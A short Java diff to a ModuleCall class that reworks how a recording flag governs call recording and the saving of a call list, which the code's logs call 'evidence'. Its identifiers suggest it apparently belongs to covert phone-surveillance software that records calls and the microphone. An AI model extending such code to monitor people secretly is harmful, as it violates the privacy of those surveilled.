@@ -126,12 +126,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		final DateTime toTime = new DateTime(call.getTimestamp());
-		boolean recording = false;
+		
 
 		try {
 			// Let's start with call recording
 			if (recordFlag && isSupported()) {
-				recording = recordCall(call, incoming, toTime);
+				recordCall(call, incoming, toTime);
 
 			}
 		} catch (Exception ex) {
@@ -140,7 +140,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
-		if (!recording && !call.isOngoing()) {
+		if (!recordFlag && !call.isOngoing()) {
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
@@ -211,7 +211,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
 			}
 
-			return true;
+		}else{
+			recordFlag = false;
 		}
 
 		mic = ModuleMic.self();
